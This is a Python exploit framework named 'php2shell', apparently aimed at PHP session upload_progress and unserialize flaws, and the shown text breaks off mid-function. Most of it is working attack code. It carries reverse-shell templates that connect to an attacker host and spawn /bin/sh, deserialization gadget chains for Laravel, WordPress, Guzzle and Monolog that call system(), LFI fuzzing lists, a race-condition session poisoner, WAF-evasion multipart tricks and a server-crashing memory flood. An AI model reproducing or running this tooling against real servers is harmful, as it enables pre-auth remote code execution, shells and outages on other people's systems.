#!/usr/bin/env python3
"""
php2shell v7.0.0 — CVE-2026-109618 / CVE-2026-109619 Exploit Framework

Pre-auth RCE chain targeting PHP's session.upload_progress handler and
var_unserializer use-after-free.  Three independent exploit categories:

  A  LFI Race — session filename injection + include via race condition
  B  Handler Mismatch — cross-directory serialize handler confusion + POP chains
  C  OOM / UAF — back-reference overflow past VAR_ENTRIES_MAX triggers use-after-free

CVE-2026-109618  Use-after-free in ext/standard/var_unserializer.re
                 Back-reference overflow past VAR_ENTRIES_MAX (1018)
                 causes freed chunks to be walked by the destructor.
                 CWE-416 / CWE-755 / CWE-824.

CVE-2026-109619  Three logic flaws in ext/session/session.c:
                 1. POST-body session fixation (PHPSESSID in body, not cookie)
                 2. Unvalidated filename in upload_progress array
                 3. Destructor fires on decode failure

Affected: PHP 5.4.0 through unpatched 8.x
Fixed in: 8.5.12, 8.4.27, 8.3.36, 8.2.35

Authorized security testing only — CTF / lab / pentest engagement.

References:
  https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC
  https://github.com/dinosn/php-8.5.5-var_destroy-uaf
  https://github.com/ikow/php2shell-poc
"""

from __future__ import annotations

import argparse
import base64
import io
import json
import os
import random
import re
import socket
import string
import struct
import sys
import textwrap
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Any

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("[!] pip install requests")

VERSION = "7.0.0"
BANNER = rf"""
    ____  __          ___       __         ____
   / __ \/ /_  ____  |__ \ ____/ /_  ___  / / /
  / /_/ / __ \/ __ \ __/ // __  / / / / |/ / /
 / ____/ / / / /_/ // __// /_/ / /_/ />  </ /___
/_/   /_/ /_/ .___//____/\__,_/\__, /_/|_/_____/
            /_/   v{VERSION}  /____/

  CVE-2026-109618 | CVE-2026-109619
  Pre-auth PHP RCE via session.upload_progress
"""

# ── Version map: branch → first-fixed tuple ─────────────────────────
FIXED_VERSIONS = {
    "8.5": (8, 5, 12),
    "8.4": (8, 4, 27),
    "8.3": (8, 3, 36),
    "8.2": (8, 2, 35),
}

# ── Session save paths to probe (24 common locations) ───────────────
SESSION_SAVE_PATHS = [
    "/var/lib/php/sessions",
    "/var/lib/php5/sessions",
    "/var/lib/php7/sessions",
    "/var/lib/php/session",
    "/var/lib/php/mod_php/session",
    "/var/lib/php-fpm/session",
    "/var/cpanel/php/sessions/ea-php74",
    "/var/cpanel/php/sessions/ea-php80",
    "/var/cpanel/php/sessions/ea-php81",
    "/var/cpanel/php/sessions/ea-php82",
    "/var/cpanel/php/sessions/ea-php83",
    "/var/db/php/sessions",
    "/var/db/php_sessions",
    "/private/var/tmp",
    "/tmp",
    "/tmp/sessions",
    "/var/lib/php/session/plesk",
    "/var/lib/php/remi/session",
    "/opt/bitnami/php/tmp",
    "/dev/shm",
    "C:\\Windows\\Temp",
    "C:\\php\\sessions",
    "/run/php",
    "/var/run/php",
]

# ── LFI parameters to fuzz (46) ────────────────────────────────────
LFI_PARAMS = [
    "page", "file", "include", "path", "doc", "template", "lang", "dir",
    "action", "module", "view", "content", "load", "read", "pg", "cat",
    "type", "name", "layout", "theme", "skin", "tpl", "style", "ctrl",
    "route", "handler", "mod", "plugin", "ext", "class", "func", "method",
    "src", "location", "url", "uri", "filename", "folder", "document",
    "p", "q", "r", "sect", "section", "area", "inc",
]

# ── PHP stream wrappers for filter chains (10) ─────────────────────
WRAPPERS = [
    "",
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "php://filter/read=convert.quoted-printable-encode/resource=",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=",
    "php://filter/zlib.deflate/resource=",
    "php://filter/read=string.toupper/resource=",
    "compress.zlib://",
    "phar://",
    "php://filter/read=convert.base64-encode|convert.base64-decode/resource=",
]

# ── Framework detection signatures ──────────────────────────────────
FRAMEWORK_SIGNATURES: dict[str, dict[str, list[str]]] = {
    "laravel": {
        "headers": ["laravel_session", "xsrf-token"],
        "cookies": ["laravel_session"],
        "body":    ["laravel", "csrf-token"],
        "files":   ["/vendor/laravel/", "/artisan"],
    },
    "wordpress": {
        "headers": ["x-powered-by: php", r"link:.*wp-json"],
        "cookies": ["wordpress_", "wp-settings-"],
        "body":    ["wp-content", "wp-includes", "wp-json"],
        "files":   ["/wp-login.php", "/wp-admin/"],
    },
    "symfony": {
        "headers": ["x-debug-token", "x-symfony"],
        "cookies": ["symfony", "PHPSESSID"],
        "body":    ["symfony", "_profiler"],
        "files":   ["/bundles/", "/_profiler/"],
    },
    "drupal": {
        "headers": ["x-drupal-cache", "x-generator: drupal"],
        "cookies": ["SESS", "Drupal.visitor"],
        "body":    ["drupal", "sites/default"],
        "files":   ["/core/misc/drupal.js", "/sites/default/"],
    },
    "codeigniter": {
        "headers": [],
        "cookies": ["ci_session"],
        "body":    ["codeigniter", "system/core"],
        "files":   ["/system/core/CodeIgniter.php"],
    },
    "cakephp": {
        "headers": [],
        "cookies": ["cakephp", "csrfToken"],
        "body":    ["cakephp"],
        "files":   ["/vendor/cakephp/"],
    },
    "yii": {
        "headers": [],
        "cookies": ["YII_CSRF_TOKEN", "_csrf"],
        "body":    ["yii", "Powered by Yii"],
        "files":   ["/assets/", "/protected/"],
    },
    "magento": {
        "headers": [],
        "cookies": ["PHPSESSID", "mage-cache"],
        "body":    ["magento", "mage/cookies"],
        "files":   ["/skin/frontend/", "/static/version"],
    },
}

# ── Exec functions to try in order ──────────────────────────────────
EXEC_FUNCTIONS = [
    "system", "shell_exec", "passthru", "exec", "popen", "proc_open",
]

# ── Reverse shell templates ─────────────────────────────────────────
REVERSE_SHELLS: dict[str, str] = {
    "php_fsockopen": (
        '$sock=fsockopen("{host}",{port});'
        '$proc=proc_open("/bin/sh -i",'
        'array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
    ),
    "php_exec": (
        '$sock=fsockopen("{host}",{port});'
        'exec("/bin/sh -i <&3 >&3 2>&3");'
    ),
    "python": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{host}",{port}));os.dup2(s.fileno(),0);'
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{host}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
        'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    ),
}

# ── OOM strategy constants ──────────────────────────────────────────
OOM_STRATEGIES = ["headers", "fields", "files", "mixed"]

MARKER = "php2shell_" + "".join(random.choices(string.ascii_lowercase, k=6))


# ====================================================================
#  Structured result collector
# ====================================================================
class ExploitResult:
    """Collects findings for JSON export and console display."""

    def __init__(self, target: str):
        self.target = target
        self.start = datetime.now(timezone.utc).isoformat()
        self.findings: list[dict[str, Any]] = []

    def add(self, title: str, severity: str, detail: str,
            evidence: str = "", category: str = ""):
        self.findings.append({
            "title": title,
            "severity": severity,
            "detail": detail,
            "evidence": evidence[:4000],
            "category": category,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        icon = {
            "critical": "[!!!]", "high": "[!!]", "medium": "[!]",
            "low": "[.]", "info": "[i]",
        }.get(severity, "[?]")
        cat = f" [{category}]" if category else ""
        print(f"  {icon} [{severity.upper()}]{cat} {title}")
        if evidence:
            for line in evidence.strip().splitlines()[:5]:
                print(f"      {line}")

    def save(self, path: str):
        blob = {
            "tool": f"php2shell v{VERSION}",
            "target": self.target,
            "start": self.start,
            "end": datetime.now(timezone.utc).isoformat(),
            "findings": self.findings,
        }
        with open(path, "w") as f:
            json.dump(blob, f, indent=2)
        print(f"\n[+] Report saved -> {path}")

    def summary(self):
        counts: dict[str, int] = {}
        for f in self.findings:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1
        parts = [f"{v} {k}" for k, v in sorted(counts.items())]
        cats: dict[str, int] = {}
        for f in self.findings:
            c = f.get("category") or "general"
            cats[c] = cats.get(c, 0) + 1
        cat_parts = [f"{k}: {v}" for k, v in sorted(cats.items())]
        print(f"\n{'='*60}")
        print(f"  Findings: {len(self.findings)} ({', '.join(parts) or 'none'})")
        if cat_parts:
            print(f"  Categories: {', '.join(cat_parts)}")
        print(f"{'='*60}")


# ====================================================================
#  POP gadget chains
# ====================================================================
class GadgetChains:
    """Deserialization gadget chains for major PHP frameworks."""

    @staticmethod
    def laravel_serializable_closure(cmd: str) -> str:
        payload = (
            'O:47:"Laravel\\SerializableClosure\\SerializableClosure":1:{'
            's:12:"serializable";'
            'O:46:"Laravel\\SerializableClosure\\Serializers\\Signed":2:{'
            f's:7:"closure";s:{len(cmd)}:"{cmd}";'
            's:4:"hash";s:44:"'
            + base64.b64encode(b"AAAA" * 8).decode() + '";}}'
        )
        return payload

    @staticmethod
    def wordpress_html_token(cmd: str) -> str:
        inner = (
            'O:15:"WP_HTML_Token":4:{'
            's:9:"on_destroy";a:2:{i:0;O:15:"WP_HTML_Token":4:{'
            f's:9:"on_destroy";s:6:"system";'
            f's:9:"bookmark_name";s:{len(cmd)}:"{cmd}";'
            's:14:"bookmark_class";N;s:13:"bookmark_value";N;}'
            f'i:1;s:9:"bookmark_name";}}'
            f's:9:"bookmark_name";s:{len(cmd)}:"{cmd}";'
            's:14:"bookmark_class";N;s:13:"bookmark_value";N;}'
        )
        return inner

    @staticmethod
    def guzzle_pumpstream(cmd: str) -> str:
        payload = (
            'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{'
            's:33:"\\0GuzzleHttp\\Psr7\\FnStream\\0methods";a:1:{'
            's:5:"close";a:2:{i:0;O:23:"GuzzleHttp\\HandlerStack":3:{'
            's:32:"\\0GuzzleHttp\\HandlerStack\\0handler";s:6:"system";'
            f's:30:"\\0GuzzleHttp\\HandlerStack\\0stack";a:1:{{i:0;a:1:{{i:0;'
            f's:{len(cmd)}:"{cmd}";}}}}'
            's:33:"\\0GuzzleHttp\\HandlerStack\\0cached";b:0;}'
            'i:1;s:7:"resolve";}}'
            's:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}'
        )
        return payload

    @staticmethod
    def monolog_buffer(cmd: str) -> str:
        payload = (
            'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{'
            's:9:"\\0*\\0socket";O:29:"Monolog\\Handler\\BufferHandler":7:{'
            's:10:"\\0*\\0handler";O:29:"Monolog\\Handler\\BufferHandler":7:{'
            's:10:"\\0*\\0handler";N;s:13:"\\0*\\0bufferSize";i:-1;'
            's:9:"\\0*\\0buffer";a:1:{i:0;a:2:{s:5:"level";i:100;'
            f's:7:"message";s:{len(cmd)}:"{cmd}";}}}}'
            's:8:"\\0*\\0level";i:100;s:14:"\\0*\\0initialized";b:1;'
            f's:14:"\\0*\\0bufferLimit";i:-1;'
            f's:13:"\\0*\\0processors";a:2:{{i:0;s:7:"current";'
            f'i:1;s:6:"system";}}}}}}'
        )
        return payload

    @staticmethod
    def probe() -> str:
        return 'O:12:"DateInterval":1:{s:1:"y";i:31337;}'

    @classmethod
    def for_framework(cls, framework: str, cmd: str) -> str:
        mapping = {
            "laravel": cls.laravel_serializable_closure,
            "wordpress": cls.wordpress_html_token,
            "guzzle": cls.guzzle_pumpstream,
            "monolog": cls.monolog_buffer,
        }
        fn = mapping.get(framework)
        if fn is None:
            raise ValueError(f"Unknown framework: {framework}")
        return fn(cmd)

    @classmethod
    def all_chains(cls, cmd: str) -> dict[str, str]:
        return {
            "laravel": cls.laravel_serializable_closure(cmd),
            "wordpress": cls.wordpress_html_token(cmd),
            "guzzle": cls.guzzle_pumpstream(cmd),
            "monolog": cls.monolog_buffer(cmd),
            "probe": cls.probe(),
        }


# ====================================================================
#  Helpers
# ====================================================================

def parse_php_version(version_str: str) -> tuple[int, ...] | None:
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", version_str)
    if m:
        return tuple(int(x) for x in m.groups())
    return None


def is_vulnerable(ver: tuple[int, ...]) -> bool:
    branch = f"{ver[0]}.{ver[1]}"
    fixed = FIXED_VERSIONS.get(branch)
    if fixed is None:
        return ver < (8, 2, 35)
    return ver < fixed


def _rand(n: int = 26) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _session(proxy: str | None = None, timeout: int = 15,
             verify: bool = True) -> requests.Session:
    s = requests.Session()
    s.verify = verify
    s.timeout = timeout
    s.headers.update({"User-Agent": f"php2shell/{VERSION}"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[502, 503, 504])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


# ── WAF-evasion multipart builder ───────────────────────────────────
def build_multipart(
    fields: list[dict[str, Any]],
    boundary: str,
    evasion: str | None = None,
) -> bytes:
    """
    Build a multipart/form-data body from a list of field dicts.

    Each dict has:
      name, value            — regular field
      name, filename, data, content_type — file field

    Evasion modes:
      lf_only        — \\n instead of \\r\\n
      double_cd      — duplicate Content-Disposition headers
      mixed_case     — randomize header casing
      whitespace     — pad header values with spaces/tabs
      utf8_bom       — prepend UTF-8 BOM to filename
      extra_semicolon— trailing semicolons in Content-Disposition
      null_padding   — null bytes after field names
    """
    crlf = b"\r\n"
    if evasion == "lf_only":
        crlf = b"\n"

    parts: list[bytes] = []
    for field in fields:
        part = b"--" + boundary.encode() + crlf
        name = field["name"]

        if "filename" in field:
            fn = field["filename"]
            ct = field.get("content_type", "application/octet-stream")
            cd = f'Content-Disposition: form-data; name="{name}"; filename="{fn}"'
        else:
            cd = f'Content-Disposition: form-data; name="{name}"'

        if evasion == "null_padding":
            cd = cd.replace(f'name="{name}"', f'name="{name}\x00"')
        if evasion == "extra_semicolon":
            cd += ";;;"
        if evasion == "utf8_bom":
            cd = "\xef\xbb\xbf" + cd
        if evasion == "mixed_case":
            cd = "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in cd
            )
        if evasion == "whitespace":
            cd = cd.replace(": ", ":  \t ")

        part += cd.encode("utf-8", errors="surrogateescape") + crlf
        if evasion == "double_cd":
            part += cd.encode("utf-8", errors="surrogateescape") + crlf

        if "filename" in field:
            ct_str = field.get("content_type", "application/octet-stream")
            part += f"Content-Type: {ct_str}".encode() + crlf

        part += crlf

        if "filename" in field:
            data = field.get("data", b"")
            part += data if isinstance(data, bytes) else data.encode()
        else:
            val = field.get("value", "")
            part += val if isinstance(val, bytes) else str(val).encode()

        part += crlf
        parts.append(part)

    body = b"".join(parts) + b"--" + boundary.encode() + b"--" + crlf
    return body


# ── Slow reader for race conditions ─────────────────────────────────
class SlowReader(io.RawIOBase):
    """Yields data byte-at-a-time with adaptive delay to keep uploads alive."""

    def __init__(self, data: bytes, chunk: int = 1, delay: float = 0.05):
        self.data = data
        self.pos = 0
        self.chunk = chunk
        self.delay = delay
        self._start = time.monotonic()

    def readinto(self, b):
        if self.pos >= len(self.data):
            return 0
        n = min(len(b), self.chunk)
        b[:n] = self.data[self.pos : self.pos + n]
        self.pos += n
        time.sleep(self.delay)
        return n

    def readable(self):
        return True

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self._start


# ====================================================================
#  Stage 0: Recon
# ====================================================================

def reachable(url: str, sess: requests.Session) -> bool:
    """Quick connectivity check."""
    try:
        r = sess.head(url, timeout=10, allow_redirects=True)
        return r.status_code < 500
    except requests.RequestException:
        return False


def recon(url: str, sess: requests.Session, result: ExploitResult) -> dict:
    """
    Full reconnaissance: version, server, framework, upload_progress status.
    """
    info: dict[str, Any] = {
        "version": None, "version_tuple": None, "server": None,
        "framework": None, "vulnerable": None,
        "upload_progress": None, "session_path_hint": None,
    }

    try:
        r = sess.get(url, allow_redirects=True, timeout=15)
    except requests.RequestException as e:
        result.add("Connection failed", "info", str(e), category="recon")
        return info

    hdrs = {k.lower(): v for k, v in r.headers.items()}

    xpb = hdrs.get("x-powered-by", "")
    if "php" in xpb.lower():
        info["version"] = xpb.strip()
        info["version_tuple"] = parse_php_version(xpb)

    info["server"] = hdrs.get("server", "")

    for name, sigs in FRAMEWORK_SIGNATURES.items():
        score = 0
        for h in sigs["headers"]:
            if any(re.search(h, v, re.I) for v in r.headers.values()):
                score += 1
        for c in sigs["cookies"]:
            if any(c.lower() in k.lower() for k in r.cookies.keys()):
                score += 1
        for b in sigs["body"]:
            if b.lower() in r.text.lower():
                score += 1
        if score >= 2:
            info["framework"] = name
            break

    if info["version_tuple"]:
        info["vulnerable"] = is_vulnerable(info["version_tuple"])
        sev = "critical" if info["vulnerable"] else "info"
        status = "VULNERABLE" if info["vulnerable"] else "patched"
        result.add(
            f"PHP {info['version']} - {status}", sev,
            f"Detected: {info['version']}\n"
            f"Fixed at: {FIXED_VERSIONS.get(f'{info['version_tuple'][0]}.{info['version_tuple'][1]}', 'unknown')}",
            evidence=xpb, category="recon",
        )
    else:
        result.add("PHP version not disclosed", "info",
                    "X-Powered-By header absent or stripped.",
                    category="recon")

    if info["framework"]:
        result.add(f"Framework: {info['framework']}", "info",
                    f"Gadget chains may be available.", category="recon")

    _check_upload_progress(url, sess, info, result)
    return info


def _check_upload_progress(url: str, sess: requests.Session,
                           info: dict, result: ExploitResult):
    """Probe whether session.upload_progress is enabled."""
    sid = _rand(26)
    boundary = "----probe" + _rand(8)
    probe_name = "probe_" + _rand(6)

    fields = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "value": probe_name},
        {"name": "file", "filename": "probe.txt",
         "data": b"A" * 256, "content_type": "text/plain"},
    ]
    body = build_multipart(fields, boundary)

    try:
        r = sess.post(
            url, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            cookies={"PHPSESSID": sid},
            timeout=10,
        )
        if r.status_code < 500:
            info["upload_progress"] = True
            result.add("upload_progress appears enabled", "high",
                        "Server accepted multipart with PHP_SESSION_UPLOAD_PROGRESS.",
                        evidence=f"HTTP {r.status_code}", category="recon")
        else:
            info["upload_progress"] = False
    except requests.RequestException:
        info["upload_progress"] = None


# ====================================================================
#  Stage 1 — Category A: Session Poisoning + LFI Race
# ====================================================================

def poison_session(
    url: str,
    sess: requests.Session,
    sid: str,
    payload: str,
    progress_name: str = "rce",
    data_size: int = 8192,
    slow: bool = False,
    evasion: str | None = None,
) -> requests.Response | None:
    """
    Poison a PHP session via upload_progress filename injection.

    The PHP_SESSION_UPLOAD_PROGRESS mechanism fires during multipart
    request-body parsing BEFORE the target .php file executes — works
    against endpoints that never call session_start().
    """
    boundary = "----" + _rand(16)
    file_data = os.urandom(data_size) if not slow else os.urandom(131072)

    fields = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "value": progress_name},
        {"name": "file", "filename": payload,
         "data": file_data, "content_type": "application/octet-stream"},
    ]
    body = build_multipart(fields, boundary, evasion=evasion)

    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    cookies = {"PHPSESSID": sid}

    try:
        if slow:
            reader = SlowReader(body, chunk=256, delay=0.08)
            headers["Content-Length"] = str(len(body))
            r = sess.post(url, data=reader, headers=headers,
                          cookies=cookies, timeout=120)
        else:
            r = sess.post(url, data=body, headers=headers,
                          cookies=cookies, timeout=15)
        return r
    except requests.RequestException:
        return None


def discover_lfi(
    url: str,
    sess: requests.Session,
    sid: str,
    session_path: str,
    result: ExploitResult,
) -> str | None:
    """
    Fuzz all LFI_PARAMS x SESSION_SAVE_PATHS x WRAPPERS for file include.
    Returns a format-string URL like 'http://…?file={}' or None.
    """
    sess_file = f"{session_path}/sess_{sid}"
    targets = [w + sess_file for w in WRAPPERS[:4]]

    total = len(LFI_PARAMS) * len(targets)
    print(f"[*] Scanning {total} LFI candidates")
    tested = 0

    for param in LFI_PARAMS:
        for target in targets:
            tested += 1
            if tested % 100 == 0:
                print(f"  [{tested}/{total}] ...")
            try:
                r = sess.get(url, params={param: target}, timeout=5)
                if r.status_code == 200 and any(
                    m in r.text for m in ["upload_progress_", "rce", "|",
                                          MARKER, "php2shell"]
                ):
                    result.add(
                        f"LFI found: ?{param}=", "high",
                        f"Parameter '{param}' includes session file at {session_path}.",
                        evidence=r.text[:300], category="cat_a",
                    )
                    return f"{url}?{param}={{}}"
            except requests.RequestException:
                continue

    result.add("No LFI parameter found", "info",
               f"Tested {total} combinations.", category="cat_a")
    return None


def confirm_lfi(
    url: str,
    sess: requests.Session,
    param: str,
    session_path: str,
    sid: str,
) -> bool:
    """Confirm a suspected LFI param by checking for session file content."""
    sess_file = f"{session_path}/sess_{sid}"
    try:
        r = sess.get(url, params={param: sess_file}, timeout=5)
        return r.status_code == 200 and len(r.text) > 10
    except requests.RequestException:
        return False


def race_a(
    url: str,
    lfi_url: str,
    sess: requests.Session,
    sid: str,
    payload: str,
    session_path: str,
    threads: int = 15,
    rounds: int = 200,
    progress_name: str = "rce",
    result: ExploitResult | None = None,
    dry_run: bool = False,
) -> bool:
    """
    Category A: Race condition — Thread A sends a slow multipart upload
    (keeping the session file alive) while Threads B..N hammer the LFI.

    session.upload_progress.cleanup = On deletes the file once the upload
    finishes — the race is to include it before that.
    """
    sess_file = f"{session_path}/sess_{sid}"
    hit = threading.Event()
    latencies: list[float] = []

    if dry_run:
        print(f"[DRY-RUN] Would race {threads} threads x {rounds} rounds")
        print(f"[DRY-RUN] Session file: {sess_file}")
        print(f"[DRY-RUN] Payload: {payload[:80]}...")
        return False

    def _poison():
        boundary = "----" + _rand(16)
        slow_data = (payload * 20).encode()
        raw = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"{progress_name}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{payload}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + slow_data + f"\r\n--{boundary}--\r\n".encode()

        reader = SlowReader(raw, chunk=256, delay=0.08)
        try:
            sess.post(
                url, data=reader,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Content-Length": str(len(raw)),
                },
                cookies={"PHPSESSID": sid},
                timeout=120,
            )
        except Exception:
            pass

    def _include():
        for wrapper in ["", "php://filter/convert.base64-decode/resource="]:
            if hit.is_set():
                return
            target = wrapper + sess_file if wrapper else sess_file
            try:
                t0 = time.monotonic()
                r = sess.get(lfi_url, params={"file": target}, timeout=5)
                elapsed = time.monotonic() - t0
                latencies.append(elapsed)
                if r.status_code == 200 and any(
                    m in r.text for m in ["uid=", "root:", "www-data",
                                          "php2shell", MARKER]
                ):
                    hit.set()
                    if result:
                        result.add(
                            "Race condition — session included!",
                            "critical",
                            f"Session file included via LFI at {lfi_url}",
                            evidence=r.text[:500], category="cat_a",
                        )
                    return
            except Exception:
                pass

    print(f"[*] Racing: {threads} threads x {rounds} rounds")
    print(f"[*] Session path: {sess_file}")

    for rnd in range(rounds):
        if hit.is_set():
            break

        pt = threading.Thread(target=_poison, daemon=True)
        pt.start()
        time.sleep(0.02)

        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = [pool.submit(_include) for _ in range(threads)]
            for f in as_completed(futures):
                if hit.is_set():
                    break

        pt.join(timeout=5)

        if rnd % 20 == 0 and latencies:
            avg = sum(latencies[-20:]) / min(len(latencies), 20)
            print(f"  [round {rnd}] avg include latency: {avg*1000:.0f}ms")

    return hit.is_set()


# ====================================================================
#  Stage 2 — Category B: Serializer Handler Mismatch
# ====================================================================

def mismatch_detect(
    url: str,
    sess: requests.Session,
    sid: str,
    result: ExploitResult,
) -> bool:
    """
    Detect whether the target has a handler mismatch by injecting a
    harmless DateInterval probe via the pipe-delimiter technique.
    """
    probe = GadgetChains.probe()
    filename = f"x|{probe}"

    boundary = "----" + _rand(16)
    fields = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "value": "mismatch_probe"},
        {"name": "file", "filename": filename,
         "data": b"A" * 256, "content_type": "application/octet-stream"},
    ]
    body = build_multipart(fields, boundary)

    try:
        r = sess.post(
            url, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            cookies={"PHPSESSID": sid},
            timeout=15,
        )
        indicators = ["31337", "DateInterval", "failed to decode session",
                       "unserialize", "session_decode"]
        if any(ind in r.text for ind in indicators):
            result.add(
                "Handler mismatch confirmed — deserialization fires",
                "critical",
                "DateInterval probe was instantiated via pipe-delimiter injection.",
                evidence=r.text[:300], category="cat_b",
            )
            return True
        if r.status_code == 500:
            result.add(
                "Handler mismatch likely — server error on decode",
                "high",
                "500 response suggests the session deserializer choked on injected data.",
                evidence=r.text[:300], category="cat_b",
            )
            return True
        result.add("Mismatch probe inconclusive", "medium",
                    f"HTTP {r.status_code}, no decode error detected.",
                    category="cat_b")
        return False
    except requests.ConnectionError:
        result.add("Mismatch probe — connection reset", "high",
                    "Server killed the connection (possible crash).",
                    category="cat_b")
        return True
    except requests.RequestException:
        return False


def mismatch_exploit(
    url: str,
    sess: requests.Session,
    sid: str,
    cmd: str,
    framework: str | None = None,
    gadget_raw: str | None = None,
    result: ExploitResult | None = None,
    dry_run: bool = False,
) -> requests.Response | None:
    """
    Category B: Exploit handler mismatch with a POP gadget chain.

    If framework is given, uses the matching gadget chain.
    If gadget_raw is given, injects that directly.
    Otherwise tries all chains.
    """
    if dry_run:
        print(f"[DRY-RUN] Would inject mismatch payload for cmd: {cmd}")
        return None

    chains: dict[str, str] = {}
    if gadget_raw:
        chains["custom"] = gadget_raw
    elif framework:
        try:
            chains[framework] = GadgetChains.for_framework(framework, cmd)
        except ValueError as e:
            print(f"[!] {e}")
            return None
    else:
        chains = GadgetChains.all_chains(cmd)

    for name, chain in chains.items():
        print(f"  -> Trying gadget: {name}")
        filename = f"x|{chain}"
        boundary = "----" + _rand(16)
        fields = [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "value": "rce_mismatch"},
            {"name": "file", "filename": filename,
             "data": b"A" * 512, "content_type": "application/octet-stream"},
        ]
        body = build_multipart(fields, boundary)

        try:
            r = sess.post(
                url, data=body,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                cookies={"PHPSESSID": sid},
                timeout=15,
            )
            if result:
                if r.status_code == 500:
                    result.add(
                        f"Gadget {name} triggered crash (500)",
                        "critical",
                        f"Gadget chain '{name}' caused server error.",
                        evidence=r.text[:300], category="cat_b",
                    )
                elif "php2shell" in r.text or MARKER in r.text:
                    result.add(
                        f"Gadget {name} — RCE confirmed!",
                        "critical",
                        f"Command output detected in response.",
                        evidence=r.text[:500], category="cat_b",
                    )
                else:
                    result.add(
                        f"Gadget {name} delivered (HTTP {r.status_code})",
                        "medium",
                        "Payload sent; no confirmation in response.",
                        category="cat_b",
                    )
            return r
        except requests.ConnectionError:
            if result:
                result.add(f"Gadget {name} — connection killed", "high",
                            "Server dropped the connection.", category="cat_b")
        except requests.RequestException:
            continue
        time.sleep(0.3)

    return None


# ====================================================================
#  Stage 3 — Category C: OOM Probe + UAF Trigger
# ====================================================================

def oom_probe(
    url: str,
    sess: requests.Session,
    sid: str,
    strategy: str = "mixed",
    rounds: int = 5,
    result: ExploitResult | None = None,
    dry_run: bool = False,
) -> dict[str, Any]:
    """
    Probe the target's memory handling by sending oversized requests.

    Strategies:
      headers  — flood with large custom headers
      fields   — many large multipart fields
      files    — many large file uploads
      mixed    — all of the above
    """
    stats: dict[str, Any] = {"strategy": strategy, "rounds": rounds,
                              "crashes": 0, "errors": 0, "baseline_ms": 0}

    if dry_run:
        print(f"[DRY-RUN] Would OOM-probe with strategy={strategy}, rounds={rounds}")
        return stats

    try:
        t0 = time.monotonic()
        sess.get(url, timeout=10)
        stats["baseline_ms"] = int((time.monotonic() - t0) * 1000)
    except requests.RequestException:
        stats["baseline_ms"] = -1

    strategies = [strategy] if strategy != "mixed" else ["headers", "fields", "files"]

    for strat in strategies:
        for rnd in range(rounds):
            print(f"  [OOM {strat} round {rnd+1}/{rounds}]", end=" ")
            try:
                if strat == "headers":
                    big_headers = {f"X-Probe-{i}": "A" * 8000 for i in range(50)}
                    r = sess.get(url, headers=big_headers, timeout=10)

                elif strat == "fields":
                    boundary = "----oom" + _rand(8)
                    fields = [
                        {"name": f"field_{i}", "value": "B" * 65536}
                        for i in range(100)
                    ]
                    body = build_multipart(fields, boundary)
                    r = sess.post(
                        url, data=body,
                        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                        cookies={"PHPSESSID": sid},
                        timeout=30,
                    )

                elif strat == "files":
                    boundary = "----oom" + _rand(8)
                    fields = [
                        {"name": f"file_{i}", "filename": f"big_{i}.bin",
                         "data": os.urandom(1048576),
                         "content_type": "application/octet-stream"}
                        for i in range(5)
                    ]
                    body = build_multipart(fields, boundary)
                    r = sess.post(
                        url, data=body,
                        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                        cookies={"PHPSESSID": sid},
                        timeout=60,
                    )
                else:
                    continue

                print(f"HTTP {r.status_code}")
                if r.status_code >= 500:
                    stats["crashes"] += 1

            except requests.ConnectionError:
                print("connection killed")
                stats["crashes"] += 1
            except requests.RequestException as e:
                print(f"error: {e}")
                stats["errors"] += 1

    if result and stats["crashes"] > 0:
        result.add(
            f"OOM probe: {stats['crashes']} crashes in {rounds * len(strategies)} rounds",
            "high",
            f"Strategy: {strategy}, baseline: {stats['baseline_ms']}ms\n"
            f"Server crashed or disconnected {stats['crashes']} times.",
            category="cat_c",
        )

    return stats


def trigger_uaf(
    url: str,
    sess: requests.Session,
    sid: str,
    payload: str,
